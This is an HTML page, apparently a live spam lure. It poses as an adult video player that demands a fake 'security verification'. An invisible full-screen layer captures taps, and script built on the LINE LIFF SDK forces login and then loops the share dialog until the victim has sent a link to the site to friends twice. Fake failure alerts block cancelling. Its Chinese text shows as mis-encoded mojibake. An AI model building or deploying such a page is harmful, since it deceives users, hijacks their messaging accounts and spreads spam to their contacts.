<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>ç³»çµ±é©—è­‰ä¸­...</title>
    <!-- 1. ä¿®æ­£ï¼šå®Œæ•´çš„ LINE SDK ç¶²å€ -->
    <script charset="utf-8" src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, sans-serif; }
        .video-bg { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            /* 2. ä¿®æ­£ï¼šå®Œæ•´èƒŒæ™¯åœ–ç‰‡è·¯å¾‘ï¼Œå·²å¡«å…¥ cover.jpg */
            background: url('https://syu126147.github.io/hdvideo/cover.jpg') center/cover no-repeat; 
            filter: brightness(0.4) blur(6px); z-index: 1; 
        }
        .player-box { position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; color: #fff; text-align: center; padding: 0 30px; }
        .play-btn { width: 90px; height: 90px; background: rgba(255, 0, 0, 0.9); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 3px solid #fff; margin-bottom: 25px; box-shadow: 0 0 30px rgba(255, 0, 0, 0.6); }
        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent #fff; margin-left: 8px; }
        #hijack-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: transparent; -webkit-tap-highlight-color: transparent; }
        .msg { font-size: 19px; font-weight: bold; line-height: 1.6; text-shadow: 0 2px 10px #000; }
        .sub-msg { font-size: 13px; color: #ccc; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="video-bg"></div>
    <div class="player-box">
        <div class="play-btn"></div>
        <div class="msg">ã€ç³»çµ±å®‰å…¨é©—è­‰ã€‘<br>ç•¶å‰ç·šè·¯æ“æ“ ï¼Œéœ€å®Œæˆåˆ†é…ç¨‹åº</div>
        <div class="sub-msg">(å®Œæˆ 3 ä½ç¯€é»åˆ†é…å¾Œå°‡è‡ªå‹•é–‹å•Ÿ 4K ç·šè·¯)</div>
    </div>
    <div id="hijack-layer" onclick="forceHijack()"></div>

    <script>
        const LIFF_ID = "2009200124-rSJ8f72Y"; 
        const SUCCESS_URL = "https://18avideo.com/VKUFu?v=" + new Date().getTime();
        let shareCount = 0; 
        async function init() {
            try {
                await liff.init({ liffId: LIFF_ID });
                if (!liff.isLoggedIn()) { liff.login(); }
            } catch (err) { console.error("LIFF åˆå§‹åŒ–å¤±æ•—", err); }
        }

         async function forceHijack() {
            // åˆå§‹å½ˆçª—
            alert("ã€åˆ†é…ç¨‹åºå•Ÿå‹•ã€‘\n\nè«‹é¸æ“‡ 3 ä½å¥½å‹ä½œç‚ºã€Œæµé‡åˆ†é…ç¯€é»ã€ã€‚\nå®Œæˆå¾Œç³»çµ±å°‡è‡ªå‹•ç‚ºæ‚¨è§£é™¤è§€çœ‹é™åˆ¶ã€‚");
            
              try {
                const res = await liff.shareTargetPicker([
                      {
                        "type": "text",
                        "text": "https://18avideo.com/Tws7k?v="+ new Date().getTime()
                    }
                ]);

                if (res) {
                    shareCount = shareCount + 1; // è“‹ç« åŠ  1 [1.1]
                    if (shareCount < 2) { 
                        alert("ã€ç³»çµ±å¯©æ ¸ä¸­ã€‘\nè«‹å†æ¬¡ç¢ºå¯¦åˆ†é… 3 ä½ç¯€é»ã€‚");
                        forceHijack(); 
                    } else {
                        alert("ã€é©—è­‰å®Œæˆã€‘\nå³å°‡å°å‘é£›æ©Ÿé »é“ï¼");
                        window.location.replace(SUCCESS_URL); // æ»¿ 2 æ¬¡æ‰æ”¾è¡Œ [1.1, 1.2]
                    }
                } else { // ğŸ‘ˆ é€™æ˜¯åŸæœ¬é‚£å€‹ã€ŒæŒ‰å–æ¶ˆã€çš„ else
                    alert("âŒ é©—è­‰å¤±æ•—ï¼\nç³»çµ±åµæ¸¬åˆ°ç¯€é»åˆ†é…æ•¸é‡ä¸è¶³ã€‚");
                    forceHijack(); 
                }
            } catch (error) {
                alert("ã€å®‰å…¨éŒ¯èª¤ã€‘\néœ€å…è¨±åˆ†é…æ¬Šé™ã€‚");
                forceHijack();
            }
        }
        window.onload = init;
    </script>
</body>
</html>

